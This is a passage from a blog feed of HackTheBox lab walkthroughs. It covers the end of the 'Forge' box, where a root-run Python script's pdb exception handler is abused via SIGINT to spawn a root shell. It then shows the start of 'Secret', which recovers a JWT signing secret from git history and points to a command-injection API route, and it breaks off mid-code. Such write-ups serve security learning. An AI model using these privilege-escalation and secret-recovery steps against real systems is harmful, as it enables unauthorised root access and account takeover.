+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1025</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Listening on localhost:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">clientsock</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the secret passsword: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">clientsock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">!=</span> <span class="s1">&#39;secretadminpassword&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Wrong password!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Welcome admin!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">What do you wanna do: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[1] View processes</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[2] View free memory</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[3] View listening sockets</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[4] Quit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">option</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">clientsock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;ps aux&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;df&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;ss -lnt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Bye</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pdb</span><span class="o">.</span><span class="n">post_mortem</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">__traceback__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">quit</span><span class="p">()</span>
+</span></span></code></pre></div><p>There&rsquo;s a hardcoded password of <code>secretadminpassword</code>. One that stands out in this code is the error/exception handling. When an exception triggered, the apps will call the Python debugger (<code>pdb</code>).  Since PDB is an interactive debugger, it is possible to <strong>run Python code</strong> during a debug session.</p>
+<p>To enter the debug session, I need to intentionally cause an error to the tool and this can be achieved by sending a SIGINT.</p>
+<h4 id="exploitation">Exploitation</h4>
+<p>First, I&rsquo;ll run the script with <code>sudo</code> and I&rsquo;ll open another SSH sessions.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
+</span></span><span class="line"><span class="cl">Listening on localhost:51411
+</span></span></code></pre></div><p>On the second SSH session, I&rsquo;ll connect to <code>26713</code> using <code>nc</code> and immediately send a SIGINT with <code>CTRL+C</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:~$ nc 127.0.0.1 <span class="m">51411</span>
+</span></span><span class="line"><span class="cl">Enter the secret passsword: secretadminpassword
+</span></span><span class="line"><span class="cl">Welcome admin!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">What <span class="k">do</span> you wanna <span class="k">do</span>: 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> View processes
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> View free memory
+</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> View listening sockets
+</span></span><span class="line"><span class="cl"><span class="o">[</span>4<span class="o">]</span> Quit
+</span></span><span class="line"><span class="cl">^C
+</span></span></code></pre></div><p>On the first SSH session, it&rsquo;s now has the Pdb prompt (debug session).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:/opt$ sudo /usr/bin/python3 /opt/remote-manage.py
+</span></span><span class="line"><span class="cl">Listening on localhost:51411
+</span></span><span class="line"><span class="cl">invalid literal <span class="k">for</span> int<span class="o">()</span> with base 10: b<span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">&gt; /opt/remote-manage.py<span class="o">(</span>27<span class="o">)</span>&lt;module&gt;<span class="o">()</span>
+</span></span><span class="line"><span class="cl">-&gt; <span class="nv">option</span> <span class="o">=</span> int<span class="o">(</span>clientsock.recv<span class="o">(</span>1024<span class="o">)</span>.strip<span class="o">())</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>Pdb<span class="o">)</span> 
+</span></span></code></pre></div><p>Since it&rsquo;s a root process, I&rsquo;ve full access now on the system.</p>
+<p><div class="img-container"><img src="imgs/image-20221015130859441.png" alt="image-20221015130859441"  /></div>
+</p>
+<p>I&rsquo;ll run <code>os.system('/bin/bash')</code> to spawn root shell and grab the root flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>Pdb<span class="o">)</span> os.system<span class="o">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@forge:/opt# ls -l /root/root.txt 
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root <span class="m">33</span> Oct <span class="m">15</span> 03:08 /root/root.txt
+</span></span><span class="line"><span class="cl">root@forge:/opt# 
+</span></span><span class="line"><span class="cl">root@forge:/opt# cat /root/root.txt 
+</span></span><span class="line"><span class="cl">73930b...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Secret</title>
+      <link>https://fahmifj.github.io/hackthebox/secret/</link>
+      <pubDate>Wed, 28 Sep 2022 00:17:45 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/secret/</guid>
+      <description>Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there&amp;rsquo;s a custom program with SUID bit that can be exploited by crashing it.
+Skills Learned Forging JWT Command injection in API Abuse Core Dump with SUID Tools nmap JWT tool curl Reconnaissance Nmap Full TCP port scan with nmap discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node.</description>
+      <content:encoded><![CDATA[<p>Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there&rsquo;s a custom program with SUID bit that can be exploited by crashing it.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Forging JWT</li>
+<li>Command injection in API</li>
+<li>Abuse Core Dump with SUID</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>nmap</li>
+<li>JWT tool</li>
+<li>curl</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Full TCP port scan with <code>nmap</code> discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node.js.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
+</span></span><span class="line"><span class="cl">$ fscan 10.10.11.120 secret
+</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.120 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+</span></span><span class="line"><span class="cl">nmap -p 22,80,3000 -sC -sV -oA nmap/all-tcp-ports-secret 10.10.11.120
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-30 23:20 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.120
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.073s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: DUMB Docs
+</span></span><span class="line"><span class="cl">3000/tcp open  http    Node.js <span class="o">(</span>Express middleware<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: DUMB Docs
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 17.04 seconds
+</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Visiting the web on port 80 shows an online API documentation page called &ldquo;DUMBDocs&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20220926161011625.png" alt="image-20220926161011625"  /></div>
+</p>
+<p>The Live Demo button points to <code>/api/</code>, but it&rsquo;s a 404.</p>
+<p><div class="img-container"><img src="imgs/image-20211031105210501.png" alt="image-20211031105210501"  /></div>
+</p>
+<p>At the bottom of the page, there&rsquo;s a button to download the API source code and I&rsquo;ll grab it.</p>
+<p><div class="img-container"><img src="imgs/image-20211031104419915.png" alt="image-20211031104419915"  /></div>
+</p>
+<p>Clicking on any of the available card menus (introduction, installation, etc.) redirects to <code>/docs</code>, which in this section it explains how to use the API.</p>
+<p><div class="img-container"><img src="imgs/image-20211031110930866.png" alt="image-20211031110930866"  /></div>
+</p>
+<p>Some sections contain <em>lorem ipsum</em> text, some are not. That should be the hint where to go further</p>
+<h3 id="tcp-3000---website">TCP 3000 - Website</h3>
+<p>On port 3000, it serves the same site as on port 80, but it served by <code>node.js</code> not <code>NGINX</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20211031110717336.png" alt="image-20211031110717336"  /></div>
+</p>
+<p>From here, I&rsquo;ll look into the API.</p>
+<h3 id="api">API</h3>
+<h4 id="register">Register</h4>
+<p>According to the documentation (<code>/docs</code>), I can register a user by sending API request to <code>/api/user/register</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
+</span></span><span class="line"><span class="cl">$ curl -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;name&#34;: &#34;syncrst&#34;,&#34;email&#34;: &#34;syncrst1@secret.com&#34;,&#34;password&#34;: &#34;syncrst&#34;}&#39;</span> http://secret.htb:3000/api/user/register
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;user&#34;</span>:<span class="s2">&#34;syncrst&#34;</span><span class="o">}</span>
+</span></span></code></pre></div><p>The response returns my username and that means the registration was successful.</p>
+<h4 id="login---jwt-token">Login -&gt; JWT token</h4>
+<p>Now that I&rsquo;ve been registered, I can login to get a <a href="https://jwt.io/introduction">JWT token</a> by sending API request to <code>/api/user/login</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
+</span></span><span class="line"><span class="cl">$ curl -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;email&#34;: &#34;syncrst1@secret.com&#34;,&#34;password&#34;: &#34;syncrst&#34;}&#39;</span> http://secret.htb:3000/api/user/login 
+</span></span><span class="line"><span class="cl">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzMxYzk5OGJkMDdlMGQ3YTU1ODcyOGYiLCJuYW1lIjoic3luY3JzdCIsImVtYWlsIjoic3luY3JzdDFAc2VjcmV0LmNvbSIsImlhdCI6MTY2NDIwNzU5OX0.VGfQxKW8DbdCCWGTeyEo6MAHhOkEqeaW-IBvyaik4oc
+</span></span></code></pre></div><p>The payload data of this JWT can be seen with <a href="https://jwt.io">jwt.io</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20220927133742256.png" alt="image-20220927133742256"  /></div>
+</p>
+<h4 id="private-route">Private Route</h4>
+<p>The last API route in this docs is <code>/api/priv</code>. I can use the auth token I got on this route, where it basically just checks for user role or privilege.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
+</span></span><span class="line"><span class="cl">$ curl -sH <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzMxYzk5OGJkMDdlMGQ3YTU1ODcyOGYiLCJuYW1lIjoic3luY3JzdCIsImVtYWlsIjoic3luY3JzdDFAc2VjcmV0LmNvbSIsImlhdCI6MTY2NDIwNzU5OX0.VGfQxKW8DbdCCWGTeyEo6MAHhOkEqeaW-IBvyaik4oc&#39;</span> http://secret.htb:3000/api/priv <span class="p">|</span> jq
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;role&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;role&#34;</span>: <span class="s2">&#34;you are normal user&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;desc&#34;</span>: <span class="s2">&#34;syncrst&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>It&rsquo;s still vague what to do with this API, so I&rsquo;ll look into the source code.</p>
+<h3 id="source-code-analysis">Source Code Analysis</h3>
+<h4 id="directory-structure">Directory Structure</h4>
+<p>The source code has the typical structure of <code>node.js</code> application</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.28» 
+</span></span><span class="line"><span class="cl">$ tree -L <span class="m">2</span> . 
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── files.zip
+</span></span><span class="line"><span class="cl">└── local-web
+</span></span><span class="line"><span class="cl">    ├── index.js
+</span></span><span class="line"><span class="cl">    ├── model
+</span></span><span class="line"><span class="cl">    ├── node_modules
+</span></span><span class="line"><span class="cl">    ├── package.json
+</span></span><span class="line"><span class="cl">    ├── package-lock.json
+</span></span><span class="line"><span class="cl">    ├── public
+</span></span><span class="line"><span class="cl">    ├── routes
+</span></span><span class="line"><span class="cl">    ├── src
+</span></span><span class="line"><span class="cl">    └── validations.js
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">7</span> directories, <span class="m">5</span> files
+</span></span></code></pre></div><h4 id="commit-history">Commit History</h4>
+<p>When I enter the <code>local-web</code> directory, my git plugin is activated, which indicates it contains git objects. It&rsquo;s worth to start with git first.</p>
+<p>Running <code>git log</code> shows the commit history, author and email address.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «local-web» «10.10.14.28» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+</span></span><span class="line"><span class="cl">$ git log 
+</span></span><span class="line"><span class="cl">commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
+</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
+</span></span><span class="line"><span class="cl">Date:   Thu Sep <span class="m">9</span> 00:03:27 <span class="m">2021</span> +0530
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    now we can view logs from server 😃
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
+</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:30:17 <span class="m">2021</span> +0530
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    removed .env <span class="k">for</span> security reasons
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">commit de0a46b5107a2f4d26e348303e76d85ae4870934
+</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
+</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:29:19 <span class="m">2021</span> +0530
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    added /downloads
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
+</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
+</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:27:35 <span class="m">2021</span> +0530
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    removed swap
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">commit 3a367e735ee76569664bf7754eaaade7c735d702
+</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
+</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:26:39 <span class="m">2021</span> +0530
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    added downloads
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
+</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
+</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:25:52 <span class="m">2021</span> +0530
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    first commit
+</span></span></code></pre></div><p>Commit <code>67d8da7</code> seems interesting. When comparing it with commit <code>de0a46b</code>, there&rsquo;s a deleted secret token.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «local-web» «10.10.14.28» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+</span></span><span class="line"><span class="cl">$ git diff 67d8da7 de0a46b <span class="p">|</span> cat
+</span></span><span class="line"><span class="cl">diff --git a/.env b/.env
+</span></span><span class="line"><span class="cl">index 31db370..fb6f587 <span class="m">100644</span>
+</span></span><span class="line"><span class="cl">--- a/.env
+</span></span><span class="line"><span class="cl">+++ b/.env
+</span></span><span class="line"><span class="cl">@@ -1,2 +1,2 @@
+</span></span><span class="line"><span class="cl"> <span class="nv">DB_CONNECT</span> <span class="o">=</span> <span class="s1">&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
+</span></span><span class="line"><span class="cl">-TOKEN_SECRET <span class="o">=</span> secret
+</span></span><span class="line"><span class="cl">+TOKEN_SECRET <span class="o">=</span> gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+</span></span></code></pre></div><p>I&rsquo;ll note that secret token.</p>
+<h4 id="web-routes">Web Routes</h4>
+<p>Looking at the <code>index.js</code> file, there are three defined routes: <code>privRoute</code>, <code>authRoute</code>, and <code>webroute</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">const <span class="nv">privRoute</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./routes/private&#39;</span><span class="o">)</span> <span class="c1"># location: routes/private.js</span>
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">// import routs 
+</span></span><span class="line"><span class="cl">const <span class="nv">authRoute</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./routes/auth&#39;</span><span class="o">)</span><span class="p">;</span> <span class="c1"># location: routes/auth.js</span>
+</span></span><span class="line"><span class="cl">const <span class="nv">webroute</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./src/routes/web&#39;</span><span class="o">)</span> <span class="c1"># location: src/routes/web.js</span>
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">//middle ware 
+</span></span><span class="line"><span class="cl">app.use<span class="o">(</span>express.json<span class="o">())</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">app.use<span class="o">(</span><span class="s1">&#39;/api/user&#39;</span>,authRoute<span class="o">)</span>
+</span></span><span class="line"><span class="cl">app.use<span class="o">(</span><span class="s1">&#39;/api/&#39;</span>, privRoute<span class="o">)</span>
+</span></span><span class="line"><span class="cl">app.use<span class="o">(</span><span class="s1">&#39;/&#39;</span>, webroute<span class="o">)</span>
+</span></span></code></pre></div><p><code>webroute</code> is the router that handles the documentation web while <code>authRoute</code> is the router that handles the API  for user registration (<code>/api/user/register</code>) and login (<code>/api/user/login</code>) .</p>
+<p>As for <code>privRoute</code>, it handles the API for private route (<code>/api/priv</code>). But, there&rsquo;s a hidden route <code>/api/logs</code> that wasn&rsquo;t listed in the API documentation. What&rsquo;s more interesting is that <code>/api/logs</code> route is vulnerable to command injection only if I pass the verification as user <code>theadmin</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/logs&#39;</span><span class="p">,</span> <span class="nx">verifytoken</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">userinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">name</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">userinfo</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">==</span> <span class="s1">&#39;theadmin&#39;</span><span class="p">){</span>
